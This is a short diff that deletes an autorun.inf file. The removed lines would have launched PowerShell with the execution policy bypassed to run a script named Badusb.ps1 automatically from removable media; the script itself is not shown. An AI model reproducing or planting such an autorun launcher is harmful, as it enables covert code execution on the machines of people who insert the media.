@@ -1,3 +1,0 @@
-[AutoRun]
-open=powershell.exe -NoProfile -ExecutionPolicy Bypass -File %\Badusb.ps1
-icon=Icon.ico
